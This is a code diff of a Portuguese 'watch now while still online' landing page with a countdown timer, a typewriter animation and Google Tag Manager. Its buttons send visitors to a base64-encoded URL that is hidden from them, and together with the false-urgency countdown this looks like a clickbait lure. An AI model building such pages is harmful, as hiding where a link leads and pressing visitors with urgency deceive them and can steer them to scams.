@@ -11,58 +11,19 @@
     <!-- CSS -->
 
     <link rel="stylesheet" href="css/style.css" />
-    <style>
-      .bt_pulsar {
-        -webkit-animation: pulse 0.7s infinite;
-      }
 
-      .bt_pulsar:hover {
-        -webkit-animation: none;
-      }
-
-      @-webkit-keyframes pulse {
-        0% {
-          @include transform(scale(0.9));
-        }
-        70% {
-          @include transform(scale(1));
-          box-shadow: 0 0 0 50px rgba(#5a99d4, 0);
-        }
-        100% {
-          @include transform(scale(0.9));
-          box-shadow: 0 0 0 0 rgba(#5a99d4, 0);
-        }
-      }
-      img {
-        display: block;
-        margin-left: auto;
-        margin-top: 50px;
-        margin-right: auto;
-        width: 300px;
-      }
-      .av {
-        display: block;
-        margin-left: auto;
-        margin-top: 10px;
-        margin-right: auto;
-        width: 150px;
-      }
-    </style>
     <!-- Google Tag Manager -->
     <script>
       (function (w, d, s, l, i) {
         w[l] = w[l] || [];
-        w[l].push({
-          "gtm.start": new Date().getTime(),
-          event: "gtm.js",
-        });
+        w[l].push({ "gtm.start": new Date().getTime(), event: "gtm.js" });
         var f = d.getElementsByTagName(s)[0],
           j = d.createElement(s),
           dl = l != "dataLayer" ? "&l=" + l : "";
         j.async = true;
         j.src = "https://www.googletagmanager.com/gtm.js?id=" + i + dl;
         f.parentNode.insertBefore(j, f);
-      })(window, document, "script", "dataLayer", "GTM-N4MDR65");
+      })(window, document, "script", "dataLayer", "GTM-59BMMTV");
     </script>
     <!-- End Google Tag Manager -->
 
@@ -72,7 +33,7 @@
     <!-- Google Tag Manager (noscript) -->
     <noscript
       ><iframe
-        src="https://www.googletagmanager.com/ns.html?id=GTM-N4MDR65"
+        src="https://www.googletagmanager.com/ns.html?id=GTM-59BMMTV"
         height="0"
         width="0"
         style="display: none; visibility: hidden"
@@ -82,19 +43,23 @@
     <center>
       <div class="row begin-countdown">
         <div class="col-md-12 text-center">
-          <h1 style="color: #ff5a5a">
+          <h2 style="color: #ff5a5a">
             <span id="pageBeginCountdownText">19 </span>
-          </h1>
+          </h2>
           <progress value="19" max="19" id="pageBeginCountdown"></progress>
         </div>
       </div>
       <h1>Veja enquanto ainda está Online</h1>
-      <a href="/py">
+      <a id="btn1">
         <img class="pres" src="img/pres.png" />
       </a>
-      <button class="bt_pulsar" id="btn1">
-        Clique aqui para Assistir Agora!
-      </button>
+      <div align="center" style="margin-top: 30px">
+        <div>
+          <button id="btn2" class="pulse-button">
+            Clique aqui para Assistir Agora!
+          </button>
+        </div>
+      </div>
       <img class="av" src="img/av.png" />
     </center>
     <script type="text/javascript">
@@ -120,6 +85,49 @@
       document.getElementById("btn1").addEventListener("click", function () {
         var hashstlp = "aHR0cHM6Ly9mdXR1cm9kZWdhbWVzLm9ubGluZS9weS8=";
         location.href = atob(hashstlp);
+      });
+      document.getElementById("btn2").addEventListener("click", function () {
+        var hashstlp = "aHR0cHM6Ly9mdXR1cm9kZWdhbWVzLm9ubGluZS9weS8=";
+        location.href = atob(hashstlp);
+      });
+    </script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function (event) {
+        // array with texts to type in typewriter
+        var dataText = ["Veja enquanto ainda está Online"];
+
+        // type one text in the typwriter
+        // keeps calling itself until the text is finished
+        function typeWriter(text, i, fnCallback) {
+          // chekc if text isn't finished yet
+          if (i < text.length) {
+            // add next character to h1
+            document.querySelector("h1").innerHTML = text.substring(0, i + 1);
+
+            // wait for a while and call this function again for next character
+            setTimeout(function () {
+              typeWriter(text, i + 1, fnCallback);
+            }, 35);
+          }
+          // text finished, call callback if there is a callback function
+          else if (typeof fnCallback == "function") {
+            // call callback after timeout
+            setTimeout(fnCallback, 700);
+          }
+        }
+        // start a typewriter animation for a text in the dataText array
+        function StartTextAnimation(i) {
+          // check if dataText[i] exists
+          if (i < dataText[i].length) {
+            // text exists! start typewriter animation
+            typeWriter(dataText[i], 0, function () {
+              // after callback (and whole text has been animated), start next text
+              StartTextAnimation(i + 1);
+            });
+          }
+        }
+        // start the text animation
+        StartTextAnimation(0);
       });
     </script>
   </body>
